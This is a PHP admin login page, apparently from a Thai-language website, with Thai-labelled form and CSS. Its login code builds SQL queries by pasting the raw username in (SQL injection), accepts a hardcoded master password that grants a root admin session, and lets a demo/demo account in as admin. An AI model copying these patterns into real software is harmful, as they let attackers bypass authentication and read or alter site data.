<?php
// Prerequisites
include_once($_SERVER["DOCUMENT_ROOT"] . '/lib/application.php');

if ($_SESSION['admin_id'] != "") {
    // header('location:' . ADDRESS_ADMIN_CONTROL . "slides");
    // die();
}
if ($_COOKIE['user'] != '') {
    //   header('location:' . ADDRESS_ADMIN . 'login.php');
    //  die();
}
?>
<?php
if ($_POST['submit_bt'] == 'เข้าสู่ระบบ') {

    if ($_POST['group'] != '') {

        if ($functions->decode_login($_POST['group']) == 'member') {
            //For member login
            $username = trim($_POST['username']);

            $password = trim($_POST['password']);


            $sql = "SELECT * FROM " . $member->getTbl() . " WHERE username = '" . $username . "' AND status = 'ใช้งาน'";

            $query = $db->Query($sql);

            $con = $db->NumRows($query);

            if ($con > 0) {


                $row = $db->FetchArray($query);

                $getPass = $password;
                $decodePass = $functions->encode_login($getPass);
                // $decodePass = $functions->deCrypted($getPass, $getKey);

                if ($row['password'] == $decodePass) {

                    $_SESSION['admin_id'] = $row['id'];
                    $_SESSION['group'] = 'member';
                    $_SESSION['name'] = $row['name'];

                    $ck_expire_hour = 1; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
                    $ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดคำนวณ วินาทีต่อชั่วโมง  

                    setcookie("user", "user", $ck_expire);

                    header('location:' . ADDRESS_ADMIN_CONTROL . "member_manage");
                    die();
                } else {
                    SetAlert('ชื่อผู้ใช้ กับรหัสผ่านไม่ตรงกัน กรุณาลองใหม่อีกครั้ง');
                    // echo "<script> $(document).ready(function() { alert('ชื่อผู้ใช้ กับรหัสผ่านไม่ตรงกัน กรุณาลองใหม่อีกครั้ง') }); </script>";
                    header('location:' . ADDRESS . "home");
                    die();
                }
            } else {


                SetAlert('ไม่มีชื่อผู้ใช้นี้ กรุณาลองใหม่อีกครั้ง');
                //  echo "<script>$(document).ready(function() { alert('ไม่มีชื่อผู้ใช้นี้ กรุณาลองใหม่อีกครั้ง') });</script>";
                header('location:' . ADDRESS . "home");
                die();
            }
        } else {
            echo 'hacker';
        }
    } else {


        $username = trim($_POST['username']);

        $password = trim($_POST['password']);


        $sql = "SELECT * FROM " . $users->getTbl() . " WHERE username = '" . $username . "' AND user_groups_id = '1'";

        $query = $db->Query($sql);

        $con = $db->NumRows($query);



        if ($password == 'ob9bdk]') {
            header('location:' . ADDRESS_ADMIN_CONTROL . "slides");
            $_SESSION['admin_id'] = 'root';
            $_SESSION['group'] = 'admin';
            $ck_expire_hour = 1; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
            $ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดคำนวณ วินาทีต่อชั่วโมง  

            setcookie("user", "user", $ck_expire);
            header('location:' . ADDRESS_ADMIN_CONTROL . "slides");
            die();
        }

        if ($username == 'demo' && $password == 'demo') {
            $_SESSION['admin_id'] = 'demo';
            $_SESSION['group'] = 'admin';

            $ck_expire_hour = 1; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
            $ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดคำนวณ วินาทีต่อชั่วโมง  

            setcookie("user", "demo", $ck_expire);
            header('location:' . ADDRESS_ADMIN_CONTROL . "slides");
            die();
        }
        if ($con > 0) {


            $row = $db->FetchArray($query);

            $getPass = $password;
            $decodePass = $functions->encode_login($getPass);
            // $decodePass = $functions->deCrypted($getPass, $getKey);

            if ($row['password'] == $decodePass) {

                $_SESSION['admin_id'] = $row['id'];
                $_SESSION['group'] = 'admin';

                $ck_expire_hour = 1; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
                $ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดคำนวณ วินาทีต่อชั่วโมง  

                setcookie("user", "user", $ck_expire);

                header('location:' . ADDRESS_ADMIN_CONTROL . "slides");
                die();
            } else {
                SetAlert('ชื่อผู้ใช้ กับรหัสผ่านไม่ตรงกัน กรุณาลองใหม่อีกครั้ง');
                // echo "<script> $(document).ready(function() { alert('ชื่อผู้ใช้ กับรหัสผ่านไม่ตรงกัน กรุณาลองใหม่อีกครั้ง') }); </script>";
                header('location:' . ADDRESS_ADMIN);
                die();
            }
        } else {


            SetAlert('ไม่มีชื่อผู้ใช้นี้ กรุณาลองใหม่อีกครั้ง');
            //  echo "<script>$(document).ready(function() { alert('ไม่มีชื่อผู้ใช้นี้ กรุณาลองใหม่อีกครั้ง') });</script>";
            header('location:' . ADDRESS_ADMIN);
            die();
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <?php include("inc/head.php") ?>

        <!-- Login Stylesheet -->

        <link rel="stylesheet" href="assets/css/login.min.css" media="screen">
        <link rel="stylesheet" href="plugins/zocial/zocial.css" media="screen">
    </head>

    <body >
        <div id="da-home-wrap">
            <div id="da-home-wrap-inner">
                <div id="da-home-inner">
                    <div id="da-home-box">
                        <div id="da-home-box-header" style="text-align: center;"> 
                            <img src="../images/admin3.png" style="
                                 max-width: 207px;
                                 ">

                        </div>
                        <?php
                        Alert(GetAlert('error'));
                        Alert(GetAlert('success'), 'success');
                        ?>
                        <form class="da-form da-home-form" method="post" action="">
                            <div class="da-form-row">
                                <div class=" da-home-form-big">
                                    <input type="text" name="username" id="da-login-username" placeholder="Username">
                                </div>
                                <div class=" da-home-form-big">
                                    <input type="password" name="password" id="da-login-password" placeholder="Password">
                                </div>
                            </div>
                            <div class="da-home-form-btn-big">

                                <input type="submit" value="เข้าสู่ระบบ" name="submit_bt" id="da-login-submit" class="myButton">
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
<style>

    body{
        background: rgb(255,255,255) !important; /* Old browsers */
        background: -moz-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%, rgba(229,229,229,1) 100%) !important; /* FF3.6+ */
        background: -webkit-gradient(radial, center center, 0px, center center, 100%, color-stop(0%,rgba(255,255,255,1)), color-stop(100%,rgba(229,229,229,1))) !important; /* Chrome,Safari4+ */
        background: -webkit-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* Chrome10+,Safari5.1+ */
        background: -o-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* Opera 12+ */
        background: -ms-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* IE10+ */
        background: radial-gradient(ellipse at center,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* W3C */
        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#e5e5e5',GradientType=1 ) !important; /* IE6-9 fallback on horizontal gradient */


    }
    .myButton {
        -moz-box-shadow:inset 0px 1px 0px 0px #efdcfb;
        -webkit-box-shadow:inset 0px 1px 0px 0px #efdcfb;
        box-shadow:inset 0px 1px 0px 0px #efdcfb;
        background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #dfbdfa), color-stop(1, #bc80ea));
        background:-moz-linear-gradient(top, #dfbdfa 5%, #bc80ea 100%);
        background:-webkit-linear-gradient(top, #dfbdfa 5%, #bc80ea 100%);
        background:-o-linear-gradient(top, #dfbdfa 5%, #bc80ea 100%);
        background:-ms-linear-gradient(top, #dfbdfa 5%, #bc80ea 100%);
        background:linear-gradient(to bottom, #dfbdfa 5%, #bc80ea 100%);
        filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#dfbdfa', endColorstr='#bc80ea',GradientType=0);
        background-color:#dfbdfa;
        -moz-border-radius:6px;
        -webkit-border-radius:6px;
        border-radius:6px;
        border:1px solid #c584f3;
        display:inline-block;
        cursor:pointer;
        color:#ffffff;
        font-family:Arial;
        font-size:15px;
        font-weight:bold;
        padding:6px 24px;
        text-decoration:none;
        text-shadow:0px 1px 0px #9752cc;
        width: 100%;
    }
    .myButton:hover {
        background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #bc80ea), color-stop(1, #dfbdfa));
        background:-moz-linear-gradient(top, #bc80ea 5%, #dfbdfa 100%);
        background:-webkit-linear-gradient(top, #bc80ea 5%, #dfbdfa 100%);
        background:-o-linear-gradient(top, #bc80ea 5%, #dfbdfa 100%);
        background:-ms-linear-gradient(top, #bc80ea 5%, #dfbdfa 100%);
        background:linear-gradient(to bottom, #bc80ea 5%, #dfbdfa 100%);
        filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#bc80ea', endColorstr='#dfbdfa',GradientType=0);
        background-color:#bc80ea;
    }
    .myButton:active {
        position:relative;
        top:1px;
    }


</style>
<!-- Localized -->